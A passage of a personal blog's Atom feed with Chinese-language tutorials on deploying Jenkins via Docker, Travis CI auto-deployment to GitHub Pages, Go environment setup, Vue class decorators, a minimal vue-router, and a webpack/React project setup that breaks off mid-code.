&lt;p&gt;</summary>
      
    
    
    
    
    <category term="实践" scheme="https://harrypangpang.github.io/tags/%E5%AE%9E%E8%B7%B5/"/>
    
  </entry>
  
  <entry>
    <title>docker部署jenkins</title>
    <link href="https://harrypangpang.github.io/2022/02/17/docker%E9%83%A8%E7%BD%B2jenkins/"/>
    <id>https://harrypangpang.github.io/2022/02/17/docker%E9%83%A8%E7%BD%B2jenkins/</id>
    <published>2022-02-17T06:06:45.000Z</published>
    <updated>2023-02-23T03:30:13.096Z</updated>
    
    <content type="html"><![CDATA[<h4 id="docker部署jenkins"><a class="markdownIt-Anchor" href="#docker部署jenkins"></a> docker部署jenkins</h4><p>如何使用docker部署Jenkins？按下面步骤走：</p><ol><li>安装docker,mac用户可以使用</li></ol><pre><code class="hljs plaintext">brew install docker</code></pre><p>最好参照官网安装，一路next<br />2. 查看docker是否安装成功<br />执行：</p><pre><code class="hljs plaintext">docker info</code></pre><p>出现下面这样就是成功了</p><pre><code class="hljs plaintext">Server:Containers: 1  Running: 1  Paused: 0  Stopped: 0Images: 30Server Version: 19.03.2Storage Driver: overlay2  Backing Filesystem: extfs  Supports d_type: true  Native Overlay Diff: trueLogging Driver: json-fileCgroup Driver: cgroupfsPlugins:  Volume: local  Network: bridge host ipvlan macvlan null overlay  Log: awslogs fluentd gcplogs gelf journald json-file local logentries splunk syslogSwarm: inactiveRuntimes: runcDefault Runtime: runcInit Binary: docker-initcontainerd version: 894b81a4b802e4eb2a91d1ce216b8817763c29fbrunc version: 425e105d5a03fabd737a126ad93d62a9eeede87finit version: fec3683Security Options:  seccomp  Profile: defaultKernel Version: 4.9.184-linuxkitOperating System: Docker DesktopOSType: linuxArchitecture: x86_64CPUs: 6Total Memory: 1.952GiBName: docker-desktopID: 3SL2:C77F:5JW2:IOHJ:SMTS...</code></pre><ol start="3"><li>新建目录</li></ol><pre><code class="hljs plaintext">mkdir jenkins</code></pre><ol start="4"><li>新建两个文件，分别是Dockerfile和docker-compose.yml<br />他们的区别可以看一下</li></ol><p>Dockerfile</p><pre><code class="hljs plaintext">FROM openjdk:8-jdkRUN apt-get update &amp;&amp; apt-get install -y git curl &amp;&amp; rm -rf /var/lib/apt/lists/*ARG user=jenkinsARG group=jenkinsARG uid=1000ARG gid=1000ARG http_port=8080ARG agent_port=50000ENV JENKINS_HOME /var/jenkins_homeENV JENKINS_SLAVE_AGENT_PORT $&#123;agent_port&#125;# Jenkins is run with user `jenkins`, uid = 1000# If you bind mount a volume from the host or a data container, # ensure you use the same uidRUN groupadd -g $&#123;gid&#125; $&#123;group&#125; \    &amp;&amp; useradd -d &quot;$JENKINS_HOME&quot; -u $&#123;uid&#125; -g $&#123;gid&#125; -m -s /bin/bash $&#123;user&#125;# Jenkins home directory is a volume, so configuration and build history # can be persisted and survive image upgradesVOLUME /var/jenkins_home# `/usr/share/jenkins/ref/` contains all reference configuration we want # to set on a fresh new installation. Use it to bundle additional plugins # or config file with your custom jenkins Docker image.RUN mkdir -p /usr/share/jenkins/ref/init.groovy.dENV TINI_VERSION 0.14.0ENV TINI_SHA 6c41ec7d33e857d4779f14d9c74924cab0c7973485d2972419a3b7c7620ff5fd# Use tini as subreaper in Docker container to adopt zombie processes RUN curl -fsSL https://github.com/krallin/tini/releases/download/v$&#123;TINI_VERSION&#125;/tini-static-amd64 -o /bin/tini &amp;&amp; chmod +x /bin/tini \  &amp;&amp; echo &quot;$TINI_SHA  /bin/tini&quot; | sha256sum -c -COPY init.groovy /usr/share/jenkins/ref/init.groovy.d/tcp-slave-agent-port.groovy# jenkins version being bundled in this docker imageARG JENKINS_VERSIONENV JENKINS_VERSION $&#123;JENKINS_VERSION:-2.60.3&#125;# jenkins.war checksum, download will be validated using itARG JENKINS_SHA=2d71b8f87c8417f9303a73d52901a59678ee6c0eefcf7325efed6035ff39372a# Can be used to customize where jenkins.war get downloaded fromARG JENKINS_URL=https://repo.jenkins-ci.org/public/org/jenkins-ci/main/jenkins-war/$&#123;JENKINS_VERSION&#125;/jenkins-war-$&#123;JENKINS_VERSION&#125;.war# could use ADD but this one does not check Last-Modified header neither does it allow to control checksum # see https://github.com/docker/docker/issues/8331RUN curl -fsSL $&#123;JENKINS_URL&#125; -o /usr/share/jenkins/jenkins.war \  &amp;&amp; echo &quot;$&#123;JENKINS_SHA&#125;  /usr/share/jenkins/jenkins.war&quot; | sha256sum -c -ENV JENKINS_UC https://updates.jenkins.ioENV JENKINS_UC_EXPERIMENTAL=https://updates.jenkins.io/experimentalRUN chown -R $&#123;user&#125; &quot;$JENKINS_HOME&quot; /usr/share/jenkins/ref# for main web interface:EXPOSE $&#123;http_port&#125;# will be used by attached slave agents:EXPOSE $&#123;agent_port&#125;ENV COPY_REFERENCE_FILE_LOG $JENKINS_HOME/copy_reference_file.logUSER $&#123;user&#125;COPY jenkins-support /usr/local/bin/jenkins-supportCOPY jenkins.sh /usr/local/bin/jenkins.shENTRYPOINT [&quot;/bin/tini&quot;, &quot;--&quot;, &quot;/usr/local/bin/jenkins.sh&quot;]# from a derived Dockerfile, can use `RUN plugins.sh active.txt` to setup /usr/share/jenkins/ref/plugins from a support bundleCOPY plugins.sh /usr/local/bin/plugins.shCOPY install-plugins.sh /usr/local/bin/install-plugins.sh</code></pre><p>docker-compose.yml:</p><pre><code class="hljs plaintext">version: &#x27;3&#x27;services:  jenkins:    build: .    image: &#x27;jenkins/jenkins:lts&#x27; #镜像    container_name: jenkins #容器名    restart: always    ports:      - &#x27;127.0.0.1:2001:8080&#x27; #本机端口号：容器端口      - &#x27;127.0.0.1:2002:50000&#x27;    volumes:      - &#x27;.:/var/jenkins_home&#x27; #数据持久目录,默认是当前目录</code></pre><ol start="5"><li>启动容器</li></ol><pre><code class="hljs plaintext">docker-compose up -d</code></pre><p>如果有报错的话，这个时候会提示，当有显示done时，就代表成功了。<br />6. 查看运行中容器</p><pre><code class="hljs plaintext">docker-compose ps</code></pre><p>你会看到</p><pre><code class="hljs plaintext">Name                Command               State                          Ports                       ------------------------------------------------------------------------------------------------------jenkins   /sbin/tini -- /usr/local/b ...   Up      127.0.0.1:2002-&gt;50000/tcp, 127.0.0.1:2001-&gt;8080/tcp</code></pre><ol start="7"><li>打开浏览器输入127.0.0.1:2001或者服务器ip+:2001</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;docker部署jenkins&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#docker部署jenkins&quot;&gt;&lt;/a&gt; docker部署jenkins&lt;/h4&gt;
&lt;p&gt;如何使用docker部署Jenkins？按下面步骤走：&lt;/p&gt;
&lt;</summary>
      
    
    
    
    
    <category term="实践" scheme="https://harrypangpang.github.io/tags/%E5%AE%9E%E8%B7%B5/"/>
    
  </entry>
  
  <entry>
    <title>github博客自动化部署</title>
    <link href="https://harrypangpang.github.io/2022/02/17/gitpages%E8%87%AA%E5%8A%A8%E9%83%A8%E7%BD%B2/"/>
    <id>https://harrypangpang.github.io/2022/02/17/gitpages%E8%87%AA%E5%8A%A8%E9%83%A8%E7%BD%B2/</id>
    <published>2022-02-17T06:06:45.000Z</published>
    <updated>2023-02-23T03:30:13.096Z</updated>
    
    <content type="html"><![CDATA[<h3 id="github博客自动化部署"><a class="markdownIt-Anchor" href="#github博客自动化部署"></a> github博客自动化部署</h3><p>原材料：github博客，<a href="http://travis-ci.org">travis-ci.org</a></p><ol><li>首先你有一个类似xxx.github.io的博客</li><li>打开 <a href="https://github.com/settings/tokens">https://github.com/settings/tokens</a></li><li>点击Personal access tokens旁的generate new token</li><li>复制好这个token，之后会需要</li><li>打开 <a href="https://travis-ci.org/">https://travis-ci.org/</a></li><li>用github登陆</li><li>点击头像，打开settings，打开你所需要部署的仓库的开关（页面上很明显能找到）</li><li>在项目根目录新建.travis.yml，并输入下面</li></ol><pre><code class="hljs plaintext">language: node_jsnode_js:- lts/*cache:  directories:  - node_modulesinstall:- npm ciscript:- npm run docs:build #scripts里输入你自己的脚步，我这里是基于vuepress的- cd docs/.vuepress/dist- echo &#x27;你自己的网址域名&#x27; &gt; CNAME #如果你需要指向自己的域名after_script:- git config credential.helper &quot;store --file=.git/credentials&quot;- echo &quot;https://$&#123;GH_TOKEN&#125;:@github.com&quot; &gt; .git/credentials- node ./node_modules/grunt-cli/bin/grunt release- git config --global user.email &quot;邮箱&quot;- git config --global user.name &quot;用户名&quot;- git init- git add .- git commit -m &#x27;deploy&#x27;- git push -f &quot;https://$&#123;GH_TOKEN&#125;@github.com/test/test.github.io.git&quot; master #更换test内容，这里参照你自己的GitHub地址去改branches:  only:  - devdeploy:  provider: pages  skip-cleanup: true  local_dir: docs/.vuepress/dist  github_token: &quot;$GH_TOKEN&quot;  keep-history: true  on:    branch: dev</code></pre><ol start="9"><li>在电脑shell里输入</li></ol><pre><code class="hljs plaintext">gem install travistravis encrypt GH_TOKEN=&quot;第四步保存的key&quot; --add</code></pre><ol start="10"><li>这个时候你会发现你的.travis.yml会多出</li></ol><pre><code class="hljs plaintext">env:  global:    - secure: &quot;lots-of-seemingly-random-characters&quot;</code></pre><p>这句话，这其实就是加密后的token，用于push代码</p><ol start="11"><li>然后就像平常一样push代码，就会自动部署啦</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;github博客自动化部署&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#github博客自动化部署&quot;&gt;&lt;/a&gt; github博客自动化部署&lt;/h3&gt;
&lt;p&gt;原材料：github博客，&lt;a href=&quot;http://travis-ci.</summary>
      
    
    
    
    
    <category term="实践" scheme="https://harrypangpang.github.io/tags/%E5%AE%9E%E8%B7%B5/"/>
    
  </entry>
  
  <entry>
    <title>go环境配置</title>
    <link href="https://harrypangpang.github.io/2021/01/17/go%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/"/>
    <id>https://harrypangpang.github.io/2021/01/17/go%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/</id>
    <published>2021-01-17T06:06:45.000Z</published>
    <updated>2023-02-23T03:30:13.096Z</updated>
    
    <content type="html"><![CDATA[<ol><li>安装go</li><li>go env -w GO111MODULE=auto //使用go 模块</li><li>go env -w GOPATH=“/Users/qiang.zhang/Documents/go_project” //修改工作目录</li><li>go env -w GOPROXY=“<a href="https://goproxy.cn">https://goproxy.cn</a>,direct” //下载超时解决方案</li><li>mkdir bin pkg src</li><li>go mod init maxcb //初始化mod</li><li>测试环境：go run *.go 编译: go build //go会自动下载包</li></ol><h3 id="docker-部署测试环境"><a class="markdownIt-Anchor" href="#docker-部署测试环境"></a> docker 部署测试环境</h3><pre><code class="hljs plaintext">redis:    image: redis:alpine    ports:      - &quot;127.0.0.1:2306:6379&quot;  mysql:    image: percona:5.7    ports:      - &quot;127.0.0.1:2307:3306&quot;    environment:      MYSQL_DATABASE: app      MYSQL_USER: app      MYSQL_PASSWORD: app      MYSQL_ROOT_PASSWORD: app    command: --character-set-server=utf8mb4 --collation-server=utf8mb4_unicode_ci  web:    build: .    links:      - redis:cache1      - mysql:db1    ports:      - &quot;127.0.0.1:2308:80&quot;    volumes:      - .:/var/www/yourproject    tty: true    working_dir: /var/www/yourproject    environment:      - GO111MODULE=auto      - GOPORT=80</code></pre><pre><code class="hljs plaintext"># Use Alpine GoFROM golang:1.11.2-alpinea# Install GitRUN apk update &amp;&amp; apk upgrade &amp;&amp; \apk add --no-cache nginx git nginx-mod-http-geoip# Build the outyet command inside the container.# (You may fetch or manage dependencies here,# either manually or with a tool like &quot;godep&quot;.)RUN export GOPROXY=https://goproxy.io,directRUN go get github.com/dgrijalva/jwt-go &amp;&amp; \    go get github.com/go-redis/redis &amp;&amp; \    go get github.com/go-sql-driver/mysql &amp;&amp; \    go get github.com/gorilla/handlers &amp;&amp; \    go get github.com/gorilla/mux &amp;&amp; \    go get github.com/jinzhu/gorm &amp;&amp; \    go get github.com/joho/godotenv &amp;&amp; \    go get gopkg.in/mgo.v2 &amp;&amp; \    go get gopkg.in/guregu/null.v3 &amp;&amp; \    go get github.com/thedevsaddam/renderer &amp;&amp; \    go get golang.org/x/sync/singleflight &amp;&amp; \    go get gopkg.in/gomail.v2 &amp;&amp; \    go get github.com/sirupsen/logrus &amp;&amp; \    go get go.uber.org/zap</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;ol&gt;
&lt;li&gt;安装go&lt;/li&gt;
&lt;li&gt;go env -w GO111MODULE=auto //使用go 模块&lt;/li&gt;
&lt;li&gt;go env -w GOPATH=“/Users/qiang.zhang/Documents/go_project” //修改工作目录&lt;/li</summary>
      
    
    
    
    
    <category term="实践" scheme="https://harrypangpang.github.io/tags/%E5%AE%9E%E8%B7%B5/"/>
    
  </entry>
  
  <entry>
    <title>vue-property-decorator使用指南</title>
    <link href="https://harrypangpang.github.io/2021/01/17/vue-property-decorator%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/"/>
    <id>https://harrypangpang.github.io/2021/01/17/vue-property-decorator%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/</id>
    <published>2021-01-17T06:06:45.000Z</published>
    <updated>2023-02-23T03:30:13.097Z</updated>
    
    <content type="html"><![CDATA[<h4 id="vue-property-decorator使用指南"><a class="markdownIt-Anchor" href="#vue-property-decorator使用指南"></a> vue-property-decorator使用指南</h4><p>vue-property-decorator是在你构建vue项目时选择class风格时使用的组件</p><p>一共有这么多属性：</p><pre><code class="hljs plaintext">@Prop@PropSync@Model@Watch@Provide@Inject@ProvideReactive@InjectReactive@Emit@Ref@Component</code></pre><p>这里只介绍常见的几种使用方法</p><ol><li>@Component<br />@Component其实是vue-class-component插件提供的，但我们使用时，仍然可以采用下面的方法：<pre><code class="hljs plaintext">&lt;template&gt;&lt;div class=&quot;home&quot;&gt;    &lt;img alt=&quot;Vue logo&quot; src=&quot;../assets/logo.png&quot; /&gt;    &lt;div&gt;&#123;&#123;title&#125;&#125;&lt;/div&gt;    &lt;HelloWorld msg=&quot;Welcome to Your Vue.js App&quot; /&gt;&lt;/div&gt;&lt;/template&gt;&lt;script lang=&#x27;ts&#x27;&gt;import &#123; Component, Prop, Vue &#125; from &#x27;vue-property-decorator&#x27;;import HelloWorld from &#x27;@/uiFeatures/HelloWorld.vue&#x27;;// 组件注册@Component(&#123;components: &#123;    HelloWorld,&#125;,&#125;)export default class Home extends Vue &#123;// 这里是为了防止this.$toast报错，暂时还没想到别的处理方法$toast:any// 这里就是data属性title:String = &#x27;title&#x27;created() &#123;    this.$toast(&#123;    msg: &#x27;This is Toast&#x27;,    visable: true,    &#125;);&#125;&#125;&lt;/script&gt;</code></pre></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;vue-property-decorator使用指南&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#vue-property-decorator使用指南&quot;&gt;&lt;/a&gt; vue-property-decorator使用指南&lt;/h4&gt;
&lt;p&gt;</summary>
      
    
    
    
    
    <category term="实践" scheme="https://harrypangpang.github.io/tags/%E5%AE%9E%E8%B7%B5/"/>
    
  </entry>
  
  <entry>
    <title>vue-router实现</title>
    <link href="https://harrypangpang.github.io/2021/01/17/vue-router%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0/"/>
    <id>https://harrypangpang.github.io/2021/01/17/vue-router%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0/</id>
    <published>2021-01-17T06:06:45.000Z</published>
    <updated>2023-02-23T03:30:13.097Z</updated>
    
    <content type="html"><![CDATA[<h3 id="vue-router实现"><a class="markdownIt-Anchor" href="#vue-router实现"></a> vue-router实现</h3><pre><code class="hljs plaintext">import Home from &quot;@/views/Home.vue&quot;;import Vue from &quot;vue&quot;;class VueRouter &#123;  [x: string]: any;  constructor(options: object) &#123;    this.$options = options;    this.routeMap = &#123;&#125;;    //挂在vue data上识别当前路由    this.app = new Vue(&#123;      data: &#123;        current: &quot;/&quot;      &#125;    &#125;);  &#125;  static install: (Vue: any) =&gt; void;  init() &#123;    this.bindEvent(); //监听路由变化    this.createRouteMap(); //构建路由键值对    this.initComponent(); //初始化router 的组件  &#125;  bindEvent() &#123;    window.addEventListener(&quot;load&quot;, this.onHashChange.bind(this));    window.addEventListener(&quot;hashchange&quot;, this.onHashChange.bind(this));  &#125;  //  hash变化时  onHashChange() &#123;    // 当前全局状态 current 就是目前hash对象的名称    this.app.current = window.location.hash.slice(1) || &quot;/&quot;;  &#125;  createRouteMap() &#123;  // 构建键值对以便找到模版    this.$options.routes.forEach((ele: object) =&gt; &#123;      this.routeMap[ele.path] = ele.component;    &#125;);  &#125;  initComponent() &#123;    // router-link,router-view    // &lt;router-link to=&quot;&quot;&gt;fff&lt;/router-link&gt;    Vue.component(&quot;router-link&quot;, &#123;      props: &#123; to: String &#125;,      render(h) &#123;      //h就是createElement 来创建VNode        // h(tag, data, children)        return h(&quot;a&quot;, &#123; attrs: &#123; href: &quot;#&quot; + this.to &#125; &#125;, [          this.$slots.default        ]);      &#125;    &#125;);    // &lt;router-view&gt;&lt;/router-view&gt;    Vue.component(&quot;router-view&quot;, &#123;      render: h =&gt; &#123;        const comp = this.routeMap[this.app.current];        return h(comp);      &#125;    &#125;);  &#125;&#125;VueRouter.install = function(Vue) &#123;  // 混入所有组件  Vue.mixin(&#123;    // 钩子函数    beforeCreate() &#123;      // 仅在根组件执行一次      if (this.$options.router) &#123;        Vue.prototype.$router = this.$options.router;        this.$options.router.init();      &#125;    &#125;  &#125;);&#125;;Vue.use(VueRouter);export default new VueRouter(&#123;  mode: &quot;history&quot;,  base: process.env.BASE_URL,  routes: [    &#123;      path: &quot;/&quot;,      name: &quot;Home&quot;,      component: Home    &#125;  ]&#125;);</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;vue-router实现&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#vue-router实现&quot;&gt;&lt;/a&gt; vue-router实现&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&quot;hljs plaintext&quot;&gt;import Home</summary>
      
    
    
    
    
    <category term="源码" scheme="https://harrypangpang.github.io/tags/%E6%BA%90%E7%A0%81/"/>
    
  </entry>
  
  <entry>
    <title>前端工程化</title>
    <link href="https://harrypangpang.github.io/2021/01/17/react16%E9%85%8D%E7%BD%AE/"/>
    <id>https://harrypangpang.github.io/2021/01/17/react16%E9%85%8D%E7%BD%AE/</id>
    <published>2021-01-17T06:06:45.000Z</published>
    <updated>2023-02-20T06:46:49.569Z</updated>
    
    <content type="html"><![CDATA[<p>前端工程化至上</p><p>目录</p><p>版本说明<br />目录结构<br />初始化项目<br />webpack<br />react<br />配置loader(sass,jsx)<br />引入babel<br />使用HtmlWebpackPlugin<br />使用webpack-dev-server<br />多入口页面配置<br />ref=“<a href="http://www.imooc.com/article/details/id/291278#entry">http://www.imooc.com/article/details/id/291278#entry</a>”&gt;如何理解entry point(bundle),chunk,module<br />多入口页面html配置<br />redux<br />使用react-router<br />使用redux-thunk<br />模块热替换（Hot Module Replacement）<br />使用ESLint<br />使用axios和async/await<br />Code Splitting<br />使用CommonsChunkPlugin<br />版本说明</p><p>由于构建相关例如webpack，babel，react-router等更新的较快，所以本文档以下面各种模块的版本号为主，各位安装的时候需要注意一下或者可以直接执行npm i将模块都安装好。</p><p>“dependencies”: {<br />“babel-core”: “^6.26.3”,<br />“babel-eslint”: “^8.2.3”,<br />“babel-loader”: “^7.1.4”,<br />“babel-plugin-transform-async-to-generator”: “^6.24.1”,<br />“babel-plugin-transform-runtime”: “^6.23.0”,<br />“babel-preset-es2015”: “^6.24.1”,<br />“babel-preset-react”: “^6.24.1”,<br />“babel-preset-stage-0”: “^6.24.1”,<br />“babel-preset-stage-3”: “^6.24.1”,<br />“css-loader”: “^0.28.11”,<br />“eslint”: “^4.19.1”,<br />“eslint-loader”: “^2.0.0”,<br />“eslint-plugin-react”: “^7.9.1”,<br />“file-loader”: “^1.1.11”,<br />“history”: “^4.7.2”,<br />“html-webpack-plugin”: “^3.2.0”,<br />“react”: “^16.6.0”,<br />“react-dom”: “^16.6.0”,<br />“react-hot-loader”: “^4.3.12”,<br />“react-redux”: “^6.0.0”,<br />“react-router”: “^4.3.1”,<br />“react-router-dom”: “^4.3.1”,<br />“redux”: “^4.0.1”,<br />“sass-loader”: “^7.0.3”,<br />“style-loader”: “^0.21.0”,<br />“url-loader”: “^1.0.1”,<br />“webpack”: “^4.12.0”,<br />“webpack-cli”: “^3.0.3”,<br />“webpack-dev-server”: “^3.1.1”<br />}<br />目录结构</p><p>开发和发布版本的配置文件是分开的，多入口页面的目录结构。</p><p>react-family/<br />|<br />|──dist/                                    * 发布版本构建输出路径<br />|<br />|──dev/                                     * 调试版本构建输出路径<br />|<br />|──src/                                     * 工具函数<br />|     |<br />|     |—— component/                        * 各页面公用组件<br />|     |<br />|     |—— page/                             * 页面代码<br />|     |      |—— index/                     * 页面代码<br />|     |      |        |—— Main/             * 组件代码<br />|     |      |        |       |—— Main.jsx  * 组件jsx<br />|     |      |        |       |—— Main.scss * 组件css<br />|     |      |<br />|     |      |—— detail/                    * 页面代码<br />|     |<br />|     |—— static/                           * 静态文件js，css<br />|<br />|<br />|──webpack.config.build.js                  * 发布版本使用的webpack配置文件<br />|──webpack.config.dev.js                    * 调试版本使用的webpack配置文件<br />|──.eslint                                  * eslint配置文件<br />|__.babelrc                                 * babel配置文件<br />初始化项目</p><p>创建文件夹<br />mkdir react-family-bucket<br />初始化npm<br />cd react-family-bucket<br />npm init<br />如果有特殊需要，可以填入自己的配置，一路回车下来，会生成一个package.json，里面是你项目的基本信息，后面的npm依赖安装也会配置在这里。</p><p>webpack</p><p>安装webpack<br />npm install webpack --save<br />or<br />npm install webpack --g<br />–save是将当前webpack安装到react-family-bucket下的/node_modules。</p><p>–g是将当前webpack安装到全局下面，可以在node的安装目录下找到全局的/node_modules。</p><p>配置webopack配置文件<br />touch webpack.config.dev.js<br />新建一个app.js</p><p>touch app.js<br />写入基本的webpack配置，可以参考这里：</p><p>const path = require(‘path’);<br />const srcRoot = ‘./src’;<br />module.exports = {</p><pre><code>// 输入配置entry: [  './app.js'],,// 输出配置output: &#123;    path: path.resolve(__dirname, './dev'),    filename: 'bundle.min.js'&#125;,</code></pre><p>};<br />3, 执行webpack命令<br />如果是全局安装：</p><p>webpack --config webpack.config.dev.js<br />如果是当前目录安装：</p><p>./node_modules/.bin/webpack --config webpack.config.dev.js<br />在package.json中添加执行命令：</p><p>“scripts”: {<br />“dev”: “./node_modules/.bin/webpack --config webpack.config.dev.js”,<br />},<br />执行npm run dev命令之后，会发现需要安装webpack-cli，（webpack4之后需要安装这个）</p><p>npm install webpack-cli --save<br />去除WARNING in configuration警告,在webpack.config.dev.js增加一个配置即可：</p><p>…<br />mode: ‘development’<br />…<br />成功之后会在dev下面生成bundle.min.js代表正常。</p><p>如果想要动态监听文件变化需要在命令后面添加 --watch</p><p>react</p><p>安装react<br />npm install react react-dom --save<br />创建page目录和index页面文件：<br />mkdir src<br />mkdir page<br />cd page<br />创建index</p><p>mkdir index<br />cd index &amp; touch index.js &amp; touch index.html<br />index.js</p><p>import ReactDom from ‘react-dom’;<br />import Main from ‘./Main/Main.jsx’;</p><p>ReactDom.render(<Main />, document.getElementById(‘root’));<br />index.html</p><!DOCTYPE html><html><head>    <title>index</title>    <meta charset="utf-8">    <meta name="viewport" content="width=device-width,initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no"></head><body><div id="root"></div></body></html><p>创建Main组件<br />import React from ‘react’;</p><p>class Main extends React.Component {</p><pre><code>constructor(props) &#123;    super(props);&#125;render() &#123;    return (&lt;div&gt;Main&lt;/div&gt;);&#125;</code></pre><p>}</p><p>export default Main;</p><p>export 和 export default区别：</p><p>export可以有多个</p><p>xx.js:<br />export const test1 = ‘a’<br />export function test2() {}</p><p>yy.js:<br />import { test1, test2 } from ‘xx.js’;<br />export default只能有1个</p><p>xx.js:<br />let test1 = ‘a’;<br />export default test1;</p><p>yy.js:<br />import test1 from ‘xx.js’;<br />export 和 module.exports<br />let exports = module.exports;<br />修改webpack配置入口文件<br />entry: [<br />path.resolve(srcRoot,‘./page/index/index.js’)<br />],<br />配置loader</p><p>处理样式文件需要这些loader:<br />css-loader<br />sass-loader<br />style-loader</p><p>npm install css-loader sass-loader style-loader file-loader --save<br />配置：</p><p>module: {<br />// 加载器配置<br />rules: [<br />{ test: /.css/, use: ['style-loader', 'css-loader'], include: path.resolve(srcRoot)},            { test: /\.scss/, use: [‘style-loader’, ‘css-loader’, ‘sass-loader’], include: path.resolve(srcRoot)}<br />]<br />},</p><p>url-loader处理处理静态文件<br />npm install url-loader --save</p><p>配置：</p><pre><code>module: &#123;    // 加载器配置    rules: [        &#123; test: /\.(png|jpg|jpeg)$/, use: 'url-loader?limit=8192&amp;name=images/[name].[hash].[ext]', include: path.resolve(srcRoot)&#125;    ]&#125;,</code></pre><p>limit:表示超过多少就使用base64来代替，单位是byte</p><p>name:可以设置图片的路径，名称和是否使用hash 具体参考这里</p><p>引入babel</p><p>bebel是用来解析es6语法或者是es7语法分解析器，让开发者能够使用新的es语法，同时支持jsx，vue等多种框架。</p><p>安装babel<br />babel-core<br />babel-loader<br />npm install babel-core babel-loader --save<br />配置：</p><p>module: {<br />// 加载器配置<br />rules: [<br />{ test: /.(js|jsx)$/, use: [{loader:‘babel-loader’}] ,include: path.resolve(srcRoot)},<br />]<br />},<br />babel配置文件：.babelrc</p><p>touch .babelrc</p><p>配置：</p><p>{<br />“presets”: [<br />“es2015”,<br />“react”,<br />“stage-0”<br />],<br />“plugins”: []<br />}<br />babel支持自定义的预设(presets)或插件(plugins),只有配置了这两个才能让babel生效，单独的安装babel是无意义的</p><p>presets：代表babel支持那种语法(就是你用那种语法写)，优先级是从下往上,state-0|1|2|…代表有很多没有列入标准的语法回已state-x表示,参考这里</p><p>plugins:代表babel解析的时候使用哪些插件，作用和presets类似，优先级是从上往下。<br />依次安装：</p><p>babel-preset-es2015<br />babel-preset-react<br />babel-preset-stage-0</p><p>npm install babel-preset-es2015 babel-preset-react babel-preset-stage-0 --save<br />babel-polyfill是什么？</p><p>我们之前使用的babel，babel-loader 默认只转换新的 JavaScript 语法，而不转换新的 API。例如，Iterator、Generator、Set、Maps、Proxy、Reflect、Symbol、Promise 等全局对象，以及一些定义在全局对象上的方法（比如 Object.assign）都不会转译。如果想使用这些新的对象和方法，必须使用 babel-polyfill，为当前环境提供一个垫片。<br />npm install --save babel-polyfill<br />使用：</p><p>import “babel-polyfill”;<br />transform-runtime有什么区别？</p><p>当使用babel-polyfill时有一些问题：<br />默认会引入所有babel支持的新语法，这样就会导致你的文件代码非常庞大。<br />通过向全局对象和内置对象的prototype上添加方法来达成目的,造成全局变量污染。</p><p>这时就需要transform-runtime来帮我们有选择性的引入</p><p>npm install --save babel-plugin-transform-runtime<br />配置文件：</p><p>{<br />“plugins”: [<br />[“transform-runtime”, {<br />“helpers”: false,<br />“polyfill”: false,<br />“regenerator”: true,<br />“moduleName”: “babel-runtime”<br />}]<br />]<br />}<br />使用HtmlWebpackPlugin</p><p>记得我们之前新建的index.html么 我们执行构建命令之后并没有将index.html打包到dev目录下 我们需要HtmlWebpackPlugin来将我们output的js和html结合起来</p><p>npm install html-webpack-plugin --save<br />配置：</p><p>const HtmlWebpackPlugin = require(‘html-webpack-plugin’);<br />…<br />plugins: [<br />new HtmlWebpackPlugin({<br />filename: path.resolve(devPath, ‘index.html’),<br />template: path.resolve(srcRoot, ‘./page/index/index.html’),<br />})<br />]<br />filename:可以设置html输出的路径和文件名</p><p>template:可以设置已哪个html文件为模版<br />更多参数配置可以参考这里</p><p>使用webpack-dev-server</p><p>webpack-dev-server是一个小型的Node.js Express服务器,它使用webpack-dev-middleware来服务于webpack的包。</p><p>安装<br />npm install webpack-dev-server --save<br />修改在package.json中添加的执行命令：</p><p>“scripts”: {<br />“dev”: “./node_modules/.bin/webpack-dev-server --config webpack.config.dev.js”,<br />},<br />配置webpack配置文件：<br />devServer: {<br />“contentBase”: devPath,<br />“compress”: true,<br />},<br />contentBase 表示server文件的根目录<br />compress 表示开启gzip<br />更多的配置文档参考这里</p><p>webpack-dev-server默认情况下会将output的内容放在内存中，是看不到物理的文件的，如果想要看到物理的dev下面的文件可以安装write-file-webpack-plugin这个插件。<br />webpack-dev-server默认会开启livereload功能<br />devtool功能：</p><p>具体来说添加了devtool: 'inline-source-map’之后，利用source-map你在chrome控制台看到的source源码都是真正的源码，未压缩，未编译前的代码，没有添加，你看到的代码是真实的压缩过，编译过的代码，更多devtool的配置可以参考这里<br />多入口文件配置</p><p>在之前的配置中，都是基于单入口页面配置的，entry和output只有一个文件，但是实际项目很多情况下是多页面的，在配置多页面时，有2中方法可以选择：</p><p>在entry入口配置时，传入对象而不是单独数组,output时利用[name]关键字来区分输出文件例如：<br />entry: {<br />index: [path.resolve(srcRoot,‘./page/index/index1.js’),path.resolve(srcRoot,‘./page/index/index2.js’)],<br />detail: path.resolve(srcRoot,‘./page/detail/detail.js’),<br />home: path.resolve(srcRoot,‘./page/home/home.js’),<br />},<br />output: {<br />path: path.resolve(__dirname, ‘./dev’),</p><pre><code>filename: '[name].min.js'</code></pre><p>},</p><p>通过node动态遍历需要entry point的目录，来动态生成entry：<br />const pageDir = path.resolve(srcRoot, ‘page’);<br />function getEntry() {<br />let entryMap = {};</p><pre><code>fs.readdirSync(pageDir).forEach((pathname)=&gt;&#123;    let fullPathName = path.resolve(pageDir, pathname);    let stat = fs.statSync(fullPathName);    let fileName = path.resolve(fullPathName, 'index.js');    if (stat.isDirectory() &amp;&amp; fs.existsSync(fileName)) &#123;        entryMap[pathname] = fileName;    